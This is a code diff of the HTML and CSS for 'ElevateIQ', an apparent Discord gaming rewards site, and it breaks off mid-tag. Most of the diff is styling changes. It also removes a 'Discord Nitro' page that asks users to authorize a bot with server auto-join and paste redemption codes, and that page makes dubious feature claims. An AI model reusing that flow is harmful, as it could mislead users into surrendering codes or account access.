+.stl{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);margin-top:3px}
+.cshow{background:linear-gradient(135deg,rgba(244,196,48,.07),rgba(244,196,48,.02));border:1px solid rgba(244,196,48,.14);border-radius:var(--r2);padding:40px 32px;margin-bottom:48px;display:flex;align-items:center;gap:40px;flex-wrap:wrap}
+.coin3d{width:100px;height:100px;border-radius:50%;flex-shrink:0;background:linear-gradient(145deg,#ffd700,#f4a01c,#ffd700,#ffec6e);display:flex;align-items:center;justify-content:center;box-shadow:0 0 36px rgba(244,196,48,.38);font-size:40px;animation:floatY 4s ease-in-out infinite}
 .cinfo{flex:1;min-width:260px}
-.cnm{font-size:34px;font-weight:800;letter-spacing:-1.5px;color:var(--go);margin-bottom:5px}
-.cds{font-size:14.5px;color:var(--t2);line-height:1.78;margin-bottom:20px}
+.cnm{font-size:32px;font-weight:800;letter-spacing:-1.5px;color:var(--go);margin-bottom:5px}
+.cds{font-size:14px;color:var(--t2);line-height:1.78;margin-bottom:18px}
 .eways{display:flex;flex-wrap:wrap;gap:8px}
-.eway{display:flex;align-items:center;gap:7px;background:rgba(244,196,48,.07);border:1px solid rgba(244,196,48,.16);border-radius:100px;padding:6px 13px;font-size:12.5px;font-weight:600;color:var(--go)}
-.rtiles{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:13px;margin-bottom:52px}
-.rtile{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:22px;cursor:pointer;position:relative;overflow:hidden;transition:all .3s cubic-bezier(.22,1,.36,1);display:flex;flex-direction:column}
-.rtile::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;transform:scaleX(0);transform-origin:left;transition:transform .4s cubic-bezier(.22,1,.36,1)}
+.eway{background:rgba(244,196,48,.07);border:1px solid rgba(244,196,48,.16);border-radius:100px;padding:6px 13px;font-size:12px;font-weight:600;color:var(--go)}
+.rtiles{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px;margin-bottom:48px}
+.rtile{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:22px;cursor:pointer;position:relative;overflow:hidden;transition:all .3s;display:flex;flex-direction:column}
+.rtile::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;transform:scaleX(0);transform-origin:left;transition:transform .4s}
 .rtile:hover::before{transform:scaleX(1)}
 .rtile:hover{transform:translateY(-5px);border-color:var(--b2)}
 .rtglow{position:absolute;top:-40px;right:-40px;width:110px;height:110px;border-radius:50%;filter:blur(36px);opacity:0;transition:opacity .3s}
 .rtile:hover .rtglow{opacity:1}
-.rico{font-size:28px;margin-bottom:13px;display:block}
+.rico{font-size:28px;margin-bottom:12px;display:block}
 .rbdg{display:inline-block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;padding:3px 9px;border-radius:100px;margin-bottom:10px}
 .rnm{font-size:17px;font-weight:700;letter-spacing:-.5px;margin-bottom:6px}
-.rds{font-size:13px;color:var(--t2);line-height:1.62;flex:1;margin-bottom:14px}
+.rds{font-size:13px;color:var(--t2);line-height:1.62;flex:1;margin-bottom:12px}
 .rpr{font-size:14px;font-weight:700;color:var(--go);margin-bottom:3px}
 .rinr{font-size:13px;font-weight:700;color:var(--t)}
 .rarr{font-size:13px;color:var(--t3);margin-top:8px;display:block;transition:all .22s}
@@ -256,26 +187,21 @@ nav{position:sticky;top:0;z-index:500;height:var(--nh);display:flex;align-items:
 .rt-mc::before{background:linear-gradient(90deg,var(--mc),transparent)}.rt-mc .rtglow{background:var(--mc)}.rt-mc .rnm{color:var(--mc)}
 .rt-rb::before{background:linear-gradient(90deg,var(--rb),transparent)}.rt-rb .rtglow{background:var(--rb)}.rt-rb .rnm{color:var(--rb)}
 .rt-xb::before{background:linear-gradient(90deg,var(--xb),transparent)}.rt-xb .rtglow{background:var(--xb)}.rt-xb .rnm{color:var(--xb)}
-
-/* EARN AD */
-.adzone{background:linear-gradient(135deg,rgba(108,99,255,.07),rgba(108,99,255,.02));border:1px solid rgba(108,99,255,.14);border-radius:var(--r2);padding:30px;text-align:center;margin:36px 0}
+/* ADZONE */
+.adzone{background:linear-gradient(135deg,rgba(108,99,255,.07),rgba(108,99,255,.02));border:1px solid rgba(108,99,255,.14);border-radius:var(--r2);padding:28px;text-align:center;margin:32px 0}
 .adprog{height:5px;background:var(--cardh);border-radius:5px;overflow:hidden;margin:12px auto 0;max-width:280px}
 .adpf{height:100%;background:linear-gradient(90deg,var(--ac),var(--ac2));border-radius:5px;width:0;transition:width .1s linear}
-.adslot{width:100%;min-height:90px;background:var(--card);border:1px dashed var(--b);border-radius:var(--r);display:flex;align-items:center;justify-content:center;color:var(--t3);font-size:11px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px}
-
 /* TRACK */
 .sinp{flex:1;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:12px 15px;color:var(--t);font-family:'DM Sans',sans-serif;font-size:14px;outline:none;transition:all .2s}
-.sinp:focus{border-color:var(--go);box-shadow:0 0 0 3px var(--gog)}
+.sinp:focus{border-color:var(--go)}
 .sinp::placeholder{color:var(--t3)}
-.sbtn{background:var(--go);color:#000;border:none;border-radius:var(--r);padding:12px 20px;font-family:'DM Sans',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;flex-shrink:0}
-.sbtn:hover{filter:brightness(1.08);transform:translateY(-1px)}
-.ocard{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:18px;margin-bottom:11px;transition:border-color .2s;animation:slideUp .32s ease both}
+.sbtn{background:var(--go);color:#000;border:none;border-radius:var(--r);padding:12px 20px;font-family:'DM Sans',sans-serif;font-size:13px;font-weight:700;cursor:pointer}
+.ocard{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:18px;margin-bottom:11px;transition:border-color .2s;animation:slideUp .3s ease both}
 .ocard:hover{border-color:var(--b2)}
 .ohdr{display:flex;align-items:center;gap:10px;margin-bottom:13px;flex-wrap:wrap}
 .oico{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0}
-.ogn{font-size:13.5px;font-weight:700;letter-spacing:-.2px}
-.oinv{font-size:11px;color:var(--t3);margin-top:1px}
-.ost{margin-left:auto;display:flex;align-items:center;gap:5px;font-size:11px;font-weight:700;padding:3px 11px;border-radius:100px;flex-shrink:0}
+.ogn{font-size:13px;font-weight:700}.oinv{font-size:11px;color:var(--t3);margin-top:1px}
+.ost{margin-left:auto;font-size:11px;font-weight:700;padding:3px 11px;border-radius:100px;flex-shrink:0}
 .stp{background:rgba(244,196,48,.09);border:1px solid rgba(244,196,48,.2);color:var(--go)}
 .std{background:var(--grg);border:1px solid rgba(0,230,118,.2);color:var(--gr)}
 .ometa{display:grid;grid-template-columns:repeat(auto-fit,minmax(88px,1fr));gap:7px;margin-bottom:13px}
@@ -284,20 +210,18 @@ nav{position:sticky;top:0;z-index:500;height:var(--nh);display:flex;align-items:
 .mv{font-size:13px;font-weight:600}
 .pbl{display:flex;justify-content:space-between;font-size:11px;color:var(--t3);margin-bottom:5px}
 .pbt{height:3px;background:rgba(255,255,255,.07);border-radius:3px;overflow:hidden}
-.pbf{height:100%;border-radius:3px;animation:progressBar 1.2s ease both}
+.pbf{height:100%;border-radius:3px}
 .tl{display:flex;flex-direction:column;gap:8px;margin:12px 0}
 .tlr{display:flex;gap:9px}
-.tld{width:21px;height:21px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:9.5px;font-weight:700;margin-top:2px}
+.tld{width:21px;height:21px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;margin-top:2px}
 .tl-d{background:var(--grg);border:1.5px solid rgba(0,230,118,.28);color:var(--gr)}
 .tl-a{background:rgba(244,196,48,.1);border:1.5px solid rgba(244,196,48,.28);color:var(--go)}
 .tl-w{background:var(--cardh);border:1.5px solid var(--b);color:var(--t3)}
-.tll{font-size:12.5px;font-weight:600}.tlt{font-size:10.5px;color:var(--t3);margin-top:2px}
+.tll{font-size:12px;font-weight:600}.tlt{font-size:10px;color:var(--t3);margin-top:2px}
 .oacts{display:flex;gap:6px;flex-wrap:wrap;margin-top:11px}
-.obtn{display:inline-flex;align-items:center;gap:5px;background:var(--cardh);border:1px solid var(--b);border-radius:8px;padding:5px 13px;font-size:12px;font-weight:600;color:var(--t2);cursor:pointer;transition:all .18s;font-family:'DM Sans',sans-serif}
-.obtn:hover{background:rgba(255,255,255,.08);border-color:var(--b2);color:var(--t)}
+.obtn{background:var(--cardh);border:1px solid var(--b);border-radius:8px;padding:5px 13px;font-size:12px;font-weight:600;color:var(--t2);cursor:pointer;font-family:'DM Sans',sans-serif}
+.obtn:hover{background:rgba(255,255,255,.08)}
 .obtn-del{color:var(--re);border-color:rgba(255,82,82,.14)}
-.obtn-del:hover{background:var(--reg);border-color:rgba(255,82,82,.28)}
-
 /* GIVEAWAY */
 .gwgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px}
 .gwcard{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:22px;transition:all .28s}
@@ -305,120 +229,65 @@ nav{position:sticky;top:0;z-index:500;height:var(--nh);display:flex;align-items:
 .gwlive{display:inline-flex;align-items:center;gap:6px;background:rgba(255,82,82,.1);border:1px solid rgba(255,82,82,.22);border-radius:100px;padding:3px 11px;font-size:11px;font-weight:700;color:var(--re);margin-bottom:11px}
 .gwdot{width:6px;height:6px;border-radius:50%;background:var(--re);animation:pulse 1.5s infinite}
 .gwended{display:inline-flex;align-items:center;gap:6px;background:var(--cardh);border:1px solid var(--b);border-radius:100px;padding:3px 11px;font-size:11px;font-weight:700;color:var(--t3);margin-bottom:11px}
-.gwprize{font-size:19px;font-weight:700;letter-spacing:-.4px;margin-bottom:5px}
+.gwprize{font-size:19px;font-weight:700;margin-bottom:5px}
 .gwhost{font-size:12px;color:var(--t3);margin-bottom:12px}
-.gwinfo{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:12px}
-.gwi strong{color:var(--t);font-weight:600}
-.gwwin{background:var(--grg);border:1px solid rgba(0,230,118,.16);border-radius:var(--r);padding:9px 13px;font-size:12.5px;color:var(--gr);font-weight:600}
-
+.gwinfo{display:flex;gap:14px;margin-bottom:12px;font-size:12px;color:var(--t2)}
+.gwinfo strong{color:var(--t)}
+.gwwin{background:var(--grg);border:1px solid rgba(0,230,118,.16);border-radius:var(--r);padding:9px 13px;font-size:12px;color:var(--gr);font-weight:600}
 /* PROFILE */
-.profhero{display:flex;align-items:center;gap:22px;padding:60px 0 36px;flex-wrap:wrap}
-.profav{width:86px;height:86px;border-radius:50%;border:3px solid var(--ac);object-fit:cover;flex-shrink:0}
-.profnm{font-size:30px;font-weight:700;letter-spacing:-1.2px;margin-bottom:4px}
+.profhero{display:flex;align-items:center;gap:22px;padding:56px 0 32px;flex-wrap:wrap}
+.profav{width:82px;height:82px;border-radius:50%;border:3px solid var(--ac);object-fit:cover}
+.profnm{font-size:28px;font-weight:700;letter-spacing:-1.2px;margin-bottom:4px}
 .profsb{font-size:14px;color:var(--t2)}
-.scards{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:11px;margin-bottom:26px}
-.scard2{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:18px;text-align:center;transition:all .22s}
-.scard2:hover{border-color:var(--b2);transform:translateY(-3px)}
-.scn{font-size:27px;font-weight:700;letter-spacing:-1px;margin-bottom:4px}
+.scards{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:11px;margin-bottom:24px}
+.scard2{background:var(--card);border:1px solid var(--b);border-radius:var(--r2);padding:18px;text-align:center}
+.scard2:hover{border-color:var(--b2)}
+.scn{font-size:26px;font-weight:700;letter-spacing:-1px;margin-bottom:4px}
 .scl{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:var(--t3)}
-.lbitem{display:flex;align-items:center;gap:13px;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 17px;transition:all .18s;animation:slideUp .32s ease both;margin-bottom:7px}
-.lbitem:hover{border-color:var(--b2);transform:translateX(4px)}
+.lbitem{display:flex;align-items:center;gap:13px;background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 17px;margin-bottom:7px;transition:all .18s}
+.lbitem:hover{border-color:var(--b2)}
 .lbrank{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;flex-shrink:0}
 .r1{background:linear-gradient(135deg,#ffd700,#f4a01c);color:#000}
 .r2{background:linear-gradient(135deg,#c0c0c0,#a8a8a8);color:#000}
 .r3{background:linear-gradient(135deg,#cd7f32,#a85a2a);color:#fff}
 .rn{background:var(--cardh);color:var(--t2)}
 .lbnm{flex:1;font-size:14px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.lbcn{display:flex;align-items:center;gap:5px;font-size:13px;font-weight:700;color:var(--go)}
-
-/* FOOTER */
-footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24px}
+.lbcn{font-size:13px;font-weight:700;color:var(--go)}
+footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:30px 24px}
 .finr{max-width:1160px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
 .fbrand{font-size:15px;font-weight:700;color:var(--t2)}.fbrand span{color:var(--ac2)}
 .flinks{display:flex;gap:20px;flex-wrap:wrap}
-.flink{font-size:13px;color:var(--t3);cursor:pointer;text-decoration:none;transition:color .18s;font-weight:500}
+.flink{font-size:13px;color:var(--t3);cursor:pointer;text-decoration:none}
 .flink:hover{color:var(--t2)}
-.fcopy{width:100%;text-align:center;font-size:10.5px;color:var(--t3);opacity:.32;margin-top:7px}
-
-/* RESPONSIVE */
+.fcopy{width:100%;text-align:center;font-size:10px;color:var(--t3);opacity:.32;margin-top:7px}
 @media(max-width:900px){.ntabs{display:none}.hbg{display:flex}}
-@media(max-width:768px){
-  .sgrid{grid-template-columns:repeat(3,1fr)}
-  .stat:nth-child(4),.stat:nth-child(5){border-top:1px solid var(--b)}
-  .stat:nth-child(3){border-right:none}
-  .rtiles{grid-template-columns:1fr 1fr}
-  .plans{grid-template-columns:1fr 1fr}
-  .brow{grid-template-columns:1fr}
-  .finr{flex-direction:column;text-align:center}
-  .cshow{padding:26px 20px;gap:22px}
-}
-@media(max-width:520px){
-  .rtiles{grid-template-columns:1fr}
-  .plans{grid-template-columns:1fr}
-  .sgrid{grid-template-columns:1fr 1fr}
-  .stat:nth-child(5){grid-column:span 2;border-right:none}
-  .gwgrid{grid-template-columns:1fr}
-}
-
-/* GIFT MODAL */
-.gmodal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);z-index:9000;display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .3s}
-.gmodal-overlay.open{opacity:1;pointer-events:all}
-.gmodal{background:var(--bg3);border:1px solid var(--b2);border-radius:var(--r3);padding:36px 28px;max-width:440px;width:100%;text-align:center;transform:scale(.92) translateY(20px);transition:all .4s cubic-bezier(.34,1.56,.64,1)}
-.gmodal-overlay.open .gmodal{transform:scale(1) translateY(0)}
-.gmodal-ico{font-size:52px;margin-bottom:14px;animation:floatY 3s ease-in-out infinite}
-.gmodal-title{font-size:26px;font-weight:700;letter-spacing:-1px;margin-bottom:8px}
-.gmodal-sub{font-size:14px;color:var(--t2);line-height:1.7;margin-bottom:22px}
-.glink-box{background:rgba(255,255,255,.04);border:1px solid var(--b2);border-radius:var(--r);padding:14px 16px;margin-bottom:18px;word-break:break-all;font-size:13px;color:var(--ac2);font-weight:600;letter-spacing:.3px}
-.gmodal-warn{font-size:11.5px;color:var(--t3);margin-top:12px;padding:8px 12px;background:rgba(255,82,82,.07);border:1px solid rgba(255,82,82,.15);border-radius:8px}
-
-/* NITRO */
-:root{--nitro:#5865f2;--nitrog:rgba(88,101,242,.12);--nitrobdr:rgba(88,101,242,.25);--nitroglow:rgba(88,101,242,.3)}
-.nitro-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin-bottom:26px}
-.nitro-card{background:var(--card);border:1.5px solid var(--nitrobdr);border-radius:var(--r2);padding:24px;position:relative;overflow:hidden;transition:all .35s cubic-bezier(.22,1,.36,1);cursor:pointer}
-.nitro-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--nitro),transparent)}
-.nitro-card:hover{transform:translateY(-4px);box-shadow:0 10px 34px var(--nitroglow);border-color:var(--nitro)}
-.nitro-card-badge{display:inline-block;padding:4px 11px;border-radius:100px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;background:var(--nitrog);color:var(--nitro);margin-bottom:13px}
-.nitro-card-title{font-size:20px;font-weight:700;letter-spacing:-.4px;margin-bottom:8px}
-.nitro-card-price{font-size:28px;font-weight:800;letter-spacing:-1px;background:linear-gradient(135deg,var(--nitro),#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:16px}
-.nitro-card-features{list-style:none;margin-bottom:18px}
-.nitro-card-features li{padding:6px 0;font-size:13px;color:var(--t2);display:flex;align-items:center;gap:8px}
-.nitro-card-features li::before{content:'✓';color:var(--gr);font-weight:700}
-.btn-nitro{background:linear-gradient(135deg,var(--nitro),#a78bfa);color:#fff;box-shadow:0 4px 18px var(--nitroglow)}
-.btn-nitro:hover{transform:translateY(-2px);box-shadow:0 8px 28px var(--nitroglow)}
-.nitro-promo-link{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,var(--nitro),#7289da);color:#fff;font-weight:700;font-size:14px;padding:13px 28px;border-radius:var(--r);text-decoration:none;transition:all .22s;margin-top:12px;box-shadow:0 4px 20px var(--nitroglow)}
-.nitro-promo-link:hover{transform:translateY(-2px);box-shadow:0 8px 30px var(--nitroglow)}
+@media(max-width:768px){.sgrid{grid-template-columns:repeat(3,1fr)}.rtiles{grid-template-columns:1fr 1fr}.plans{grid-template-columns:1fr 1fr}.brow{grid-template-columns:1fr}.cshow{padding:24px 18px;gap:20px}}
+@media(max-width:520px){.rtiles{grid-template-columns:1fr}.plans{grid-template-columns:1fr}.sgrid{grid-template-columns:1fr 1fr}.gwgrid{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
-<div class="bgs"><div class="bgm"></div><div class="bgo o1"></div><div class="bgo o2"></div></div>
-
-<!-- NAV -->
+<div class="bgs"><div class="bgm"></div><div class="o1"></div><div class="o2"></div></div>
 <nav>
   <div class="ni">
     <div class="brand" onclick="go('home')"><div class="bmark">EQ</div><span class="bname">Elevate<span>IQ</span></span></div>
     <div class="ntabs">
-      <button class="ntab active" data-page="home"    onclick="go('home')">Home</button>
-      <button class="ntab" data-page="nitro"  onclick="go('nitro')">💎 Nitro</button>
-      <button class="ntab" data-page="earn"    onclick="go('earn')">Earn IQCoins</button>
-      <button class="ntab" data-page="redeem"  onclick="go('redeem')">Redeem Code</button>
-      <button class="ntab" data-page="coins"   onclick="go('coins')">Coin Rewards</button>
-      <button class="ntab" data-page="giveaway"onclick="go('giveaway')">Giveaways</button>
+      <button class="ntab" data-page="home" onclick="go('home')">Home</button>
+      <button class="ntab" data-page="earn" onclick="go('earn')">Earn IQCoins</button>
+      <button class="ntab" data-page="redeem" onclick="go('redeem')">Redeem Code</button>
+      <button class="ntab" data-page="coins" onclick="go('coins')">Coin Rewards</button>
+      <button class="ntab" data-page="giveaway" onclick="go('giveaway')">Giveaways</button>
       <button class="ntab" data-page="profile" onclick="go('profile')">Profile</button>
-      <button class="ntab" data-page="track"   onclick="go('track')">Track Order</button>
+      <button class="ntab" data-page="track" onclick="go('track')">Track Order</button>
     </div>
     <div class="nr">
       <div class="cpill" id="cpill" onclick="go('earn')">🪙 <span id="nav-coins">0</span></div>
-      <div id="nav-auth"><button class="dc-btn" onclick="dcLogin()">
-        <svg width="14" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg>
-        Login with Discord
-      </button></div>
+      <div id="nav-auth"><button class="dcb" onclick="dcLogin()">Login with Discord</button></div>
       <button class="hbg" id="hbgBtn"><span></span><span></span><span></span></button>
     </div>
   </div>
 </nav>
 <div class="mob" id="mobNav">
   <button class="ntab" onclick="go('home');closeMob()">🏠 Home</button>
-  <button class="ntab" onclick="go('nitro');closeMob()">💎 Discord Nitro</button>
   <button class="ntab" onclick="go('earn');closeMob()">🪙 Earn IQCoins</button>
   <button class="ntab" onclick="go('redeem');closeMob()">🎫 Redeem Code</button>
   <button class="ntab" onclick="go('coins');closeMob()">💰 Coin Rewards</button>
@@ -427,523 +296,259 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
   <button class="ntab" onclick="go('track');closeMob()">📦 Track Order</button>
 </div>
 
-<!-- NITRO PAGE -->
-<div class="page" id="page-nitro">
-<div class="wsm">
-  <div style="padding-top:68px;margin-bottom:34px" class="rv">
-    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--nitro);margin-bottom:9px">💎 Discord Nitro</div>
-    <h2 style="font-size:clamp(30px,5.5vw,52px);font-weight:700;letter-spacing:-2px;margin-bottom:12px">Premium Discord<br/><span style="background:linear-gradient(135deg,var(--nitro),#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">Membership</span></h2>
-    <p style="font-size:15px;color:var(--t2);line-height:1.8">Choose your plan, authorize Discord bot, enter your code — activated within 48 hours.</p>
-  </div>
-
-  <div class="nitro-grid rv d1">
-    <div class="nitro-card" onclick="nitroSelectPlan('basic')">
-      <div class="nitro-card-badge">Nitro Basic</div>
-      <div class="nitro-card-title">Basic</div>
-      <div class="nitro-card-price">$2.99/mo</div>
-      <ul class="nitro-card-features">
-        <li>Custom Emoji anywhere</li>
-        <li>50MB upload limit</li>
-        <li>Special Nitro badge</li>
-        <li>Custom stickers</li>
-      </ul>
-      <button class="btn btn-nitro btn-full" style="font-size:13px;padding:11px">Select Basic</button>
-    </div>
-    <div class="nitro-card" onclick="nitroSelectPlan('classic')">
-      <div class="nitro-card-badge">Nitro Classic</div>
-      <div class="nitro-card-title">Classic</div>
-      <div class="nitro-card-price">$9.99/mo</div>
-      <ul class="nitro-card-features">
-        <li>Everything in Basic</li>
-        <li>HD video streaming</li>
-        <li>2 Server Boosts</li>
-        <li>100MB file uploads</li>
-        <li>Custom discriminator</li>
-      </ul>
-      <button class="btn btn-nitro btn-full" style="font-size:13px;padding:11px">Select Classic</button>
-    </div>
-    <div class="nitro-card" onclick="nitroSelectPlan('full')">
-      <div class="nitro-card-badge">Nitro Full</div>
-      <div class="nitro-card-title">Full</div>
-      <div class="nitro-card-price">$14.99/mo</div>
-      <ul class="nitro-card-features">
-        <li>Everything in Classic</li>
-        <li>200+ premium games</li>
-        <li>500MB upload limit</li>
-        <li>Animated avatar</li>
-        <li>Server profile customization</li>
-        <li>HD video &amp; screen share</li>
-      </ul>
-      <button class="btn btn-nitro btn-full" style="font-size:13px;padding:11px">Select Full</button>
-    </div>
-  </div>
-
-  <div class="card rv d2" id="nitro-s1">
-    <div class="cline" style="background:linear-gradient(90deg,var(--nitro),transparent)"></div>
-    <h3>Step 1 — Authorize Discord Bot</h3>
-    <p>Authorize our Discord bot to verify your account and enable auto-join to our secure server.</p>
-    <div class="notice ni2" style="margin-bottom:18px">
-      <div class="nt" style="color:var(--nitro)">Why Discord Bot?</div>
-      <p>We use <strong>Discord OAuth 2.0</strong> to verify your identity. Your credentials stay with Discord, never shared with us.</p>
-    </div>
-    <button class="btn btn-nitro btn-full" onclick="nitroBotAuth()">
-      <svg width="15" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg>
-      Authorize Discord Bot
-    </button>
-  </div>
-
-  <div class="card rv d2" id="nitro-s2" style="display:none">
-    <div class="cline" style="background:linear-gradient(90deg,var(--nitro),transparent)"></div>
-    <div class="upill" style="background:var(--nitrog);border-color:var(--nitrobdr)">
-      <div class="uav" id="nitro-uav" style="background:linear-gradient(135deg,var(--nitro),#7289da)">?</div>
-      <div style="flex:1;min-width:0"><div class="unm" id="nitro-unm">—</div><div style="font-size:11px;color:var(--t3)" id="nitro-usub">—</div></div>
-      <div class="ubdg" style="color:var(--nitro)">Verified</div>
-      <button class="bsw" onclick="nitroOut()">Switch</button>
-    </div>
-    <h3>Step 2 — Select Plan &amp; Enter Code</h3>
-    <p>Choose your Nitro plan and paste your redemption code below.</p>
-    <div class="field">
-      <label>Nitro Plan</label>
-      <select class="inp" id="nitro-plan" style="cursor:pointer">
-        <option value="">— Select Plan —</option>
-        <option value="basic">Nitro Basic ($2.99/mo)</option>
-        <option value="classic">Nitro Classic ($9.99/mo)</option>
-        <option value="full">Nitro Full ($14.99/mo)</option>
-      </select>
-    </div>
-    <div class="field">
-      <label>Redemption Code</label>
-      <div class="irow">
-        <input class="inp code" id="nitro-code" type="text" maxlength="19" placeholder="XXXX-XXXX-XXXX" oninput="nitroFmtCode(this)" autocomplete="off" spellcheck="false"/>
-        <button class="iact" onclick="pasteC('nitro-code')" title="Paste">⌘</button>
-      </div>
-      <div class="fmsg" id="nitro-msg">Format: XXXX-XXXX-XXXX</div>
-    </div>
-    <button class="btn btn-nitro btn-full" id="nitro-btn" onclick="nitroRedeem()">
-      <span id="nitro-bt">Redeem Discord Nitro</span>
-      <div class="bspin" id="nitro-sp" style="display:none"></div>
-    </button>
-  </div>
-
-  <div class="scard" id="nitro-ok">
-    <div class="sico" style="background:var(--nitrog);border:2px solid var(--nitrobdr)">
-      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--nitro)" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12" stroke-dasharray="30" stroke-dashoffset="30" style="animation:checkDraw .5s .2s ease forwards"/></svg>
-    </div>
-    <div class="stitle" style="color:var(--nitro)">Nitro Redeemed! 🎉</div>
-    <p class="sdesc">Your Discord Nitro code has been submitted. Activation within <strong>48 hours</strong>.</p>
-    <div class="timrow" style="border-color:var(--nitrobdr)">Order ID: <strong id="nitro-oid" style="color:var(--nitro)">—</strong></div>
-    <div id="nitro-gift-area" style="display:none;background:var(--nitrog);border:1px solid var(--nitrobdr);border-radius:var(--r2);padding:20px;margin:14px 0;text-align:center">
-      <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--nitro);margin-bottom:6px">🎁 Your Gift Link</div>
-      <p style="font-size:13px;color:var(--t2);margin-bottom:12px">Click below to open your exclusive gift link. Single use only!</p>
-      <a class="nitro-promo-link" id="nitro-gift-url" href="#" target="_blank">
-        <svg width="15" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg>
-        Open Your Gift Link
-      </a>
-      <div style="font-size:11px;color:var(--t3);margin-top:10px">⚠️ Single use only — do not share this link</div>
-    </div>
-    <div id="nitro-no-gift" style="background:var(--card);border:1px solid var(--b);border-radius:var(--r);padding:13px 16px;margin:14px 0;font-size:13px;color:var(--t2);text-align:center">
-      📬 Gift link will be sent to your Discord DMs within 48 hours
-    </div>
-    <div class="timrow">⏱ Activates within <strong>&nbsp;48 hours</strong></div>
-    <div class="brow" style="margin-top:14px">
-      <button class="btn btn-nitro" onclick="go('track')">Track Order</button>
-      <button class="btn btn-gh" onclick="go('home')">Back to Home</button>
-    </div>
-  </div>
-</div>
-</div>
-
-<!-- HOME -->
+<!-- HOME PAGE -->
 <div class="page" id="page-home">
 <div class="wrap">
   <section class="hero">
-    <div class="hchip rv"><div class="hdot"></div>ElevateIQ Rewards — 2026</div>
-    <h1 class="htitle rv d1">Earn. Redeem.<br/>Elevate.</h1>
-    <p class="hsub rv d2">The most rewarding gaming community. Earn IQCoins through invites, messages, ads and daily rewards — redeem for real gaming rewards.</p>
-    <div class="hbtns rv d3">
-      <button class="btn btn-dc" onclick="dcLogin()">
